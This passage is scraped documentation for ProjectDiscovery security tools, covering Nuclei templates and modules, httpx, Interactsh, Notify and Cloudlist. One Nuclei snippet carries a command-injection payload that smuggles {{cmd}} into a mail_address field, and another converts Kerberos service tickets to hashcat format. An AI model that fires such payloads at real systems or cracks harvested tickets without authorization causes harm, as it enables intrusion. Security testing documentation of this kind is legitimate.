'acme.com:80');\nconn.Close();\n```\n\n----------------------------------------\n\nTITLE: Checking POP3 Server Availability with IsPOP3 Method\nDESCRIPTION: Demonstrates how to use the IsPOP3 method to check if a host is running a POP3 server. It takes a host and port as parameters and returns an IsPOP3Response object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/pop3.Pop3Client.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst pop3 = require('nuclei/pop3');\nconst isPOP3 = pop3.IsPOP3('acme.com', 110);\nlog(toJSON(isPOP3));\n```\n\n----------------------------------------\n\nTITLE: ADObject Interface Properties Definition\nDESCRIPTION: TypeScript interface definition for ADObject containing optional properties for Active Directory attributes. Properties include DistinguishedName, LastLogon, MemberOf, PWDLastSet, SAMAccountName, and ServicePrincipalName.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.ADObject.mdx#2025-04-12_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\ninterface ADObject {\n  DistinguishedName?: string;\n  LastLogon?: string;\n  MemberOf?: string[];\n  PWDLastSet?: string;\n  SAMAccountName?: string;\n  ServicePrincipalName?: string[];\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IKEv2 Exchange Type Constants in TypeScript\nDESCRIPTION: Constant definitions for IKEv2 exchange types including Authentication (35), Create Child SA (36), Informational (37), and SA Init (34) exchanges.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ikev2.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nconst IKE_EXCHANGE_AUTH: 35\nconst IKE_EXCHANGE_CREATE_CHILD_SA: 36\nconst IKE_EXCHANGE_INFORMATIONAL: 37\nconst IKE_EXCHANGE_SA_INIT: 34\n```\n\n----------------------------------------\n\nTITLE: Running Katana with List Input\nDESCRIPTION: Illustrates how to use a file containing a list of URLs as input for Katana using the -list option.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ cat url_list.txt\n\nhttps://tesla.com\nhttps://google.com\n```\n\nLANGUAGE: sh\nCODE:\n```\nkatana -list url_list.txt\n```\n\n----------------------------------------\n\nTITLE: Defining JSON Extractor in YAML for Nuclei\nDESCRIPTION: Example of a JSON extractor to extract the value of the 'id' object from a JSON response using JQ-like syntax.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/extractors.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n      - type: json # type of the extractor\n        part: body\n        name: user\n        json:\n          - '.[] | .id'  # JQ like syntax for extraction\n```\n\n----------------------------------------\n\nTITLE: Nuclei Command with Missing Required Variables\nDESCRIPTION: This snippet demonstrates Nuclei's output when there are missing required parameters in the OpenAPI schema. It shows how Nuclei halts execution and suggests ways to provide the missing parameters.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/input-formats.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n ./nuclei -l rest-openapi.yaml -im openapi -V \"X-API-Key=23\" \n\n                           __     _\n         ____  __  _______/ /__  (_)\n        / __ \\/ / / / ___/ / _ \\/ /\n       / / / / /_/ / /__/ /  __/ /\n      /_/ /_/\\__,_/\\___/_/\\___/_/   v3.2.0\n\n            projectdiscovery.io\n\n    [ERR] openapi: Found 3 missing parameters, use -skip-format-validation flag to skip requests or update missing parameters generated in required_openapi_params.yaml file,you can also specify these vars using -var flag in (key=value) format\n```\n\n----------------------------------------\n\nTITLE: Running interactsh-client with Protected Self-Hosted Server\nDESCRIPTION: This snippet demonstrates how to use interactsh-client with a self-hosted Interactsh server that requires authentication, using the 'token' flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/running.mdx#2025-04-12_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\ninteractsh-client -server hackwithautomation.com -token XXX\n```\n\n----------------------------------------\n\nTITLE: Converting TGS to Hashcat Format in Kerberos\nDESCRIPTION: The TGStoHashcat function converts a TGS (Ticket Granting Service) to a hashcat format. It takes a TGS of any type and a username string as parameters, returning either a string or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.mdx#2025-04-12_snippet_4\n\nLANGUAGE: TypeScript\nCODE:\n```\n▸ **TGStoHashcat**(`tgs`, `username`): `string` | ``null``\n```\n\n----------------------------------------\n\nTITLE: Adding Go Binary Directory to PATH in Shell Config\nDESCRIPTION: Line to add to your shell configuration file to include the Go binary directory in your PATH environment variable.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nexport PATH=\"$PATH:insert/go/path/here/bin\"\n```\n\n----------------------------------------\n\nTITLE: Installing Nuclei using Brew\nDESCRIPTION: This command installs Nuclei using Homebrew package manager. It is supported on macOS and Linux systems.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nbrew install nuclei\n```\n\n----------------------------------------\n\nTITLE: Checking SMTP Server Example using JavaScript\nDESCRIPTION: Example showing how to use the SMTP client to verify if a server is running SMTP. Creates a client connection to a specified host and port, then checks if it's an SMTP server.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst client = new smtp.Client('acme.com', 25);\nconst isSMTP = client.IsSMTP();\nlog(isSMTP)\n```\n\n----------------------------------------\n\nTITLE: Customizing Screenshot Output Directory with httpx in Bash\nDESCRIPTION: This example shows how to specify a custom output directory for storing screenshots taken by httpx using the -srd option.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -screenshot -srd /path/to/custom/directory -u https://example.com\n```\n\n----------------------------------------\n\nTITLE: Configuring AWS Provider for Cloudlist\nDESCRIPTION: YAML configuration block for integrating Amazon Web Services with Cloudlist. Includes options for access keys, session tokens, and role assumption.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: aws # provider is the name of the provider\n  # id is the name defined by user for filtering (optional)\n  id: staging\n  # aws_access_key is the access key for AWS account\n  aws_access_key: $AWS_ACCESS_KEY\n  # aws_secret_key is the secret key for AWS account\n  aws_secret_key: $AWS_SECRET_KEY\n  # aws_session_token session token for temporary security credentials retrieved via STS (optional)\n  aws_session_token: $AWS_SESSION_TOKEN\n  # assume_role_name is the name of the role to assume (optional)\n  assume_role_name: $AWS_ASSUME_ROLE_NAME\n  # account_ids is the aws account ids which has similar assumed role name (optional)\n  account_ids:\n    - $AWS_ACCOUNT_ID_1\n    - $AWS_ACCOUNT_ID_2\n```\n\n----------------------------------------\n\nTITLE: CIDR Range Scanning\nDESCRIPTION: Demonstrates scanning an entire CIDR IP range using httpx to discover active HTTP/HTTPS servers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\necho 173.0.84.0/24 | httpx -silent\n```\n\n----------------------------------------\n\nTITLE: Running Nuclei Templates with Tags\nDESCRIPTION: Demonstrates how to execute Nuclei templates using the -tags flag to scan target URLs for specific vulnerabilities like CVEs.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/faq.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnuclei -tags cve -list target_urls.txt\n```\n\n----------------------------------------\n\nTITLE: Setting Connection Timeout\nDESCRIPTION: Demonstrates how to set a timeout value for the network connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconn.SetTimeout(10);\n```\n\n----------------------------------------\n\nTITLE: Initializing SMTP Client in JavaScript\nDESCRIPTION: Creates a new SMTP Client instance with the specified host and port.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.Client.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst client = new smtp.Client('acme.com', 25);\n```\n\n----------------------------------------\n\nTITLE: Using TLS SNI Annotation with Interactsh URL in Nuclei\nDESCRIPTION: This example demonstrates how to use the @tls-sni annotation with an Interactsh URL for dynamic TLS SNI in a Nuclei HTTP request.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/request-tampering.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n- |\n  @tls-sni: interactsh-url\n  POST /conf_mail.php HTTP/1.1\n  Host: {{Hostname}}\n  Content-Type: application/x-www-form-urlencoded\n  \n  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Asset GET Endpoint Definition\nDESCRIPTION: OpenAPI/Swagger specification for retrieving asset details via GET request using an asset ID parameter\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/get-enumerated-asset-details.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/asset/{asset_id}\n```\n\n----------------------------------------\n\nTITLE: Defining IKEv2 Flag and Version Constants in TypeScript\nDESCRIPTION: Constants for IKEv2 initiator bit check flag (8) and protocol version identifier (32).\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ikev2.mdx#2025-04-12_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nconst IKE_FLAGS_InitiatorBitCheck: 8\nconst IKE_VERSION_2: 32\n```\n\n----------------------------------------\n\nTITLE: Using Log Method in GoConsolePrinter\nDESCRIPTION: The Log method outputs standard informational messages to the console. It accepts a string parameter containing the message to be displayed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/goconsole.GoConsolePrinter.mdx#2025-04-12_snippet_1\n\nLANGUAGE: TypeScript\nCODE:\n```\nLog(msg: string): void\n```\n\n----------------------------------------\n\nTITLE: DNS Recursion Configuration\nDESCRIPTION: Shows how to configure DNS recursion settings to determine if the resolver should return cached results or traverse the DNS tree.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nrecursion: true\n```\n\n----------------------------------------\n\nTITLE: Authenticating SMTPMessage in JavaScript\nDESCRIPTION: Authenticates the SMTP message using a username and password before sending.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPMessage.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.Auth('username', 'password');\n```\n\n----------------------------------------\n\nTITLE: Sending Notifications from Output File in Notify\nDESCRIPTION: Shows how to send notifications using a saved output file from subfinder\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsubfinder -d hackerone.com -o h1.txt; notify -data h1.txt\n```\n\n----------------------------------------\n\nTITLE: Configuring AWS IAM Policy for ProjectDiscovery Integration\nDESCRIPTION: This JSON policy defines the minimal set of read-only permissions required for ProjectDiscovery to access and monitor various AWS services. It includes actions for EC2, Route53, S3, Lambda, ELB, CloudFront, ECS, EKS, API Gateway, and Lightsail.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/integrations.mdx#2025-04-12_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"RequiredReadPermissions\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"ec2:DescribeInstances\",\n        \"ec2:DescribeRegions\",\n        \"route53:ListHostedZones\",\n        \"route53:ListResourceRecordSets\",\n        \"s3:ListAllMyBuckets\",\n        \"lambda:ListFunctions\",\n        \"elasticloadbalancing:DescribeLoadBalancers\",\n        \"elasticloadbalancing:DescribeTargetGroups\",\n        \"elasticloadbalancing:DescribeTargetHealth\",\n        \"cloudfront:ListDistributions\",\n        \"ecs:ListClusters\",\n        \"ecs:ListServices\",\n        \"ecs:ListTasks\",\n        \"ecs:DescribeTasks\",\n        \"ecs:DescribeContainerInstances\",\n        \"eks:ListClusters\",\n        \"eks:DescribeCluster\",\n        \"apigateway:GET\",\n        \"lightsail:GetInstances\",\n        \"lightsail:GetRegions\"\n      ],\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Linear API for Workflow State IDs in GraphQL\nDESCRIPTION: GraphQL query to retrieve workflow state IDs from Linear. This query returns all workflow states with their respective IDs and names, necessary for configuring ticket states in the Linear integration.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/integrations.mdx#2025-04-12_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  workflowStates {\n    nodes {\n      id\n      name\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Cloudflare Provider in YAML\nDESCRIPTION: Example configuration block for integrating Cloudflare with Cloudlist. Requires either a Global API Key or a scoped API token.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: cloudflare\n  email: $CF_EMAIL\n  api_key: $CF_API_KEY\n  api_token: $CF_API_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Listing SMBv2 Metadata\nDESCRIPTION: Connects to an SMB server and retrieves SMBv2 metadata. Returns metadata object containing server information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SMBClient.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst smb = require('nuclei/smb');\nconst client = new smb.SMBClient();\nconst metadata = client.ListSMBv2Metadata('acme.com', 445);\nlog(to_json(metadata));\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Asset Group Name with httpx in Console\nDESCRIPTION: This example demonstrates how to set a custom asset group name when uploading httpx results to the PDCP UI Dashboard.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_13\n\nLANGUAGE: console\nCODE:\n```\n$ chaos -d hackerone.com | httpx -dashboard -aname \"Custom Asset Group\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Heroku Provider for Cloudlist\nDESCRIPTION: YAML configuration block for integrating Heroku with Cloudlist. Requires an API token for authentication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: heroku # provider is the name of the provider\n  # id is the name defined by user for filtering (optional)\n  id: staging\n  # heroku_api_token is the api key for Heroku account\n  heroku_api_token: $HEROKU_API_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Random Data Generation in JavaScript\nDESCRIPTION: Functions for generating random data. 'Rand' returns a random byte slice of specified length, while 'RandInt' returns a random integer.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nRand(n int) []byte\nRandInt() int\n```\n\n----------------------------------------\n\nTITLE: Listing Directories with Nuclei fs Module\nDESCRIPTION: Lists only directories in a specified directory using the ListDir function with 'dir' as the itemType parameter. Returns an array of directory names or null if the operation fails.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/fs.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst fs = require('nuclei/fs');\n// this will only return directories in /tmp directory\nconst dirs = fs.ListDir('/tmp', 'dir');\n```\n\n----------------------------------------\n\nTITLE: Running interactsh-client with Session File\nDESCRIPTION: This snippet shows how to use interactsh-client with a session file to store and read session information, allowing resumption of the same session for polling interactions even after the client is stopped or closed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-client -sf interact.session\n\n    _       __                       __       __  \n   (_)___  / /____  _________ ______/ /______/ /_ \n  / / __ \\/ __/ _ \\/ ___/ __ '/ ___/ __/ ___/ __ \\\n / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /\n/_/_/ /_/\\__/\\___/_/   \\__,_/\\___/\\__/____/_/ /_/ 1.0.3\n\n        projectdiscovery.io\n\n[INF] Listing 1 payload for OOB Testing\n[INF] c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro\n\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received DNS interaction (A) from 172.253.226.100 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received DNS interaction (AAAA) from 32.3.34.129 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received HTTP interaction from 43.22.22.50 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received DNS interaction (MX) from 43.3.192.3 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received DNS interaction (TXT) from 74.32.183.135 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received SMTP interaction from 32.85.166.50 at 2021-26-26 12:26\n```\n\n----------------------------------------\n\nTITLE: Installing AlterX using Go\nDESCRIPTION: This command installs the latest version of AlterX using Go's package manager. It requires Go to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/alterx/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install github.com/projectdiscovery/alterx/cmd/alterx@latest\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Declaration for Asset Exposure Metrics\nDESCRIPTION: OpenAPI specification fragment defining the GET endpoint for asset exposure metrics at /v1/asset/exposures/metrics.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/asset/get-exposure-metrics.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /v1/asset/exposures/metrics\n```\n\n----------------------------------------\n\nTITLE: Defining TGS Interface Properties in TypeScript\nDESCRIPTION: Defines the structure of the TGS (Ticket Granting Service) interface with three optional properties: Ticket of type Ticket, Hash of type string, and ErrMsg of type string. This interface represents the response received from a GetServiceTicket request.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.TGS.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface TGS {\n  Ticket?: Ticket;\n  Hash?: string;\n  ErrMsg?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Template Flow Functions in JavaScript\nDESCRIPTION: Functions for template flow control. 'iterate' normalizes and iterates over arguments, returning an array of objects. 'Dedupe' de-duplicates given values and returns a new array of unique values.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\niterate(...any) []any\nnew Dedupe()\n```\n\n----------------------------------------\n\nTITLE: Basic Headless Navigation in Nuclei\nDESCRIPTION: A simple template that demonstrates basic headless browser navigation in Nuclei. It navigates to a target URL and waits for the page to load completely, serving as a starting point for headless browser testing.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: basic-headless-request\n\ninfo:\n  name: Basic Headless Request\n  author: pdteam\n  severity: info\n\nheadless:\n  - steps: \n    - action: navigate\n      args:\n        url: \"{{BaseURL}}\" \n    - action: waitload\n```\n\n----------------------------------------\n\nTITLE: JSON Manipulation Functions in JavaScript\nDESCRIPTION: Functions for converting objects to JSON and printing JSON to console. 'to_json' converts an object to JSON, while 'dump_json' prints an object as JSON to the console.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nto_json(any) object\ndump_json(any)\n```\n\n----------------------------------------\n\nTITLE: Sending Notifications to Specific Providers in Notify\nDESCRIPTION: Shows how to send notifications to specific providers like Discord and Slack\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\nsubfinder -d hackerone.com -o h1.txt; notify -data h1.txt -bulk -provider discord,slack\n```\n\n----------------------------------------\n\nTITLE: Configuring Webhook Endpoints for ProjectDiscovery Notifications\nDESCRIPTION: Example format for a webhook endpoint URL that can be used to receive notifications from ProjectDiscovery. This endpoint would receive HTTP requests containing event data from the platform.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/integrations.mdx#2025-04-12_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nhttps://your-domain.com/api/security/alerts\n```\n\n----------------------------------------\n\nTITLE: Creating Markdown Table for Supported AWS Services\nDESCRIPTION: This snippet defines a markdown table listing the supported AWS services and their descriptions. It provides an overview of which AWS resources can be discovered and monitored by ProjectDiscovery.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/integrations.mdx#2025-04-12_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n| Service | Description |\n|:-------|:------------|\n| [EC2](https://aws.amazon.com/ec2/) | VM instances and their public IPs |\n| [Route53](https://aws.amazon.com/route53/) | DNS hosted zones and records |\n| [S3](https://aws.amazon.com/s3/) | Buckets (especially those public or with DNS) |\n| [Cloudfront](https://aws.amazon.com/cloudfront/) | CDN distributions and their domains |\n| [ECS](https://aws.amazon.com/ecs/) | Container cluster resources |\n| [EKS](https://aws.amazon.com/eks/) | Kubernetes cluster endpoints |\n| [ELB](https://aws.amazon.com/elasticloadbalancing/) | Load balancers (Classic ELB and ALB/NLB) |\n| [ELBv2](https://aws.amazon.com/elasticloadbalancing/) | Load balancers (Classic ELB and ALB/NLB) |\n| [Lambda](https://aws.amazon.com/lambda/) | Serverless function endpoints |\n| [Lightsail](https://aws.amazon.com/lightsail/) | Lightsail instances (simplified VPS) |\n| [Apigateway](https://aws.amazon.com/api-gateway/) | API endpoints deployed via Amazon API Gateway |\n```\n\n----------------------------------------\n\nTITLE: Setting JavaScript Concurrency in Nuclei CLI\nDESCRIPTION: Configures the maximum number of parallel JavaScript runtimes for templates with 'flow' field and JavaScript protocol.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n-jsc <number> or -js-concurrency <number>\n```\n\n----------------------------------------\n\nTITLE: Connecting to SMB Server in Info Mode\nDESCRIPTION: Connects to an SMB server to discover SMB information and returns handshake log. Requires host and port parameters.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SMBClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst smb = require('nuclei/smb');\nconst client = new smb.SMBClient();\nconst info = client.ConnectSMBInfoMode('acme.com', 445);\nlog(to_json(info));\n```\n\n----------------------------------------\n\nTITLE: Sending Notifications with Piped Output in Notify\nDESCRIPTION: Demonstrates how to pipe subfinder output directly to notify for bulk notifications\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsubfinder -d hackerone.com | notify -bulk\n```\n\n----------------------------------------\n\nTITLE: Installing httpx from GitHub source\nDESCRIPTION: Clones the httpx repository, builds from source, and installs it to the local system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/install.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/projectdiscovery/httpx.git; \\\ncd httpx/cmd/httpx; \\\ngo build; \\\nmv httpx /usr/local/bin/; \\\nhttpx -version;\n```\n\n----------------------------------------\n\nTITLE: Installing TunnelX using Docker in Bash\nDESCRIPTION: Docker commands for pulling and running the official TunnelX image or building it locally. TunnelX is used for cloud-managed internal scanning, establishing isolated SOCKS5 proxies for secure scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/internal-scan.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n# Pull and run the official image\ndocker run --network host -d \\\n  -e PDCP_API_KEY=\"your_api_key\" \\\n  projectdiscovery/tunnelx:latest\n\n# Or build locally\ndocker build -t tunnelx https://github.com/projectdiscovery/tunnelx.git\ndocker run --network host -d -e PDCP_API_KEY=\"your_api_key\" tunnelx\n```\n\n----------------------------------------\n\nTITLE: Favicon Hash Extraction\nDESCRIPTION: Shows extraction of mmh3 hashes from favicon.ico files of target domains for fingerprinting.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nsubfinder -d hackerone.com -silent | httpx -favicon\n```\n\n----------------------------------------\n\nTITLE: Sending Notifications to Specific IDs in Notify\nDESCRIPTION: Demonstrates sending notifications to specific configured IDs\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/running.mdx#2025-04-12_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\nsubfinder -d hackerone.com -o h1.txt; notify -data h1.txt -bulk -id recon,vulns,scan\n```\n\n----------------------------------------\n\nTITLE: Initializing Network Requests in Nuclei YAML\nDESCRIPTION: Starts the network requests section in a Nuclei template. This is the basic structure for beginning network-based scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Start the requests for the template right here\ntcp:\n```\n\n----------------------------------------\n\nTITLE: Installing dnsx using Go\nDESCRIPTION: This command installs ProjectDiscovery's dnsx using Go. It requires Go to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Asset Enumeration Endpoint Definition\nDESCRIPTION: YAML definition for the GET /v1/asset/enumerate API endpoint that provides asset enumeration capabilities.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/get-enumeration-list.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/asset/enumerate\n```\n\n----------------------------------------\n\nTITLE: Using clsx in JavaScript\nDESCRIPTION: Examples of using clsx with various input types including strings, objects, arrays, and mixed inputs.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/clsx/readme.md#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport clsx from 'clsx';\n// or\nimport { clsx } from 'clsx';\n\n// Strings (variadic)\nclsx('foo', true && 'bar', 'baz');\n//=> 'foo bar baz'\n\n// Objects\nclsx({ foo:true, bar:false, baz:isTrue() });\n//=> 'foo baz'\n\n// Objects (variadic)\nclsx({ foo:true }, { bar:false }, null, { '--foobar':'hello' });\n//=> 'foo --foobar'\n\n// Arrays\nclsx(['foo', 0, false, 'bar']);\n//=> 'foo bar'\n\n// Arrays (variadic)\nclsx(['foo'], ['', 0, false, 'bar'], [['baz', [['hello'], 'there']]]);\n//=> 'foo bar baz hello there'\n\n// Kitchen sink (with nesting)\nclsx('foo', [1 && 'bar', { baz:false, bat:null }, ['hello', ['world']]], 'cya');\n//=> 'foo bar hello world cya'\n```\n\n----------------------------------------\n\nTITLE: Enabling LDAP Protocol Support in Interactsh\nDESCRIPTION: Command to start Interactsh server with LDAP protocol support and logging enabled.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_11\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-server -domain hackwithautomation.com -sa -ldap\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Webhook Notifications in YAML\nDESCRIPTION: Custom webhook configurations supporting different HTTP methods, headers and payload formats including JSON and Sprig templating.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\ncustom:\n  - id: webhook\n    custom_webhook_url: http://host/api/webhook\n    custom_method: GET\n    custom_format: '{{data}}'\n    custom_headers:\n      Content-Type: application/json\n      X-Api-Key: XXXXX\n      \ncustom:\n  - id: webhookJson\n    custom_webhook_url: http://host/api/webhook\n    custom_method: GET\n    custom_format: '{\"text\":{{dataJsonString}} }'\n    custom_headers:\n      Content-Type: application/json\n      X-Api-Key: XXXXX\n\ncustom:\n  - id: webhook\n    custom_webhook_url: http://host/api/webhook\n    custom_method: GET\n    custom_sprig: '{\"text\":\"{{ .url }}\"}'    custom_headers:\n      Content-Type: application/json\n      X-Api-Key: XXXXX\n```\n\n----------------------------------------\n\nTITLE: Configuring TLS Connection in 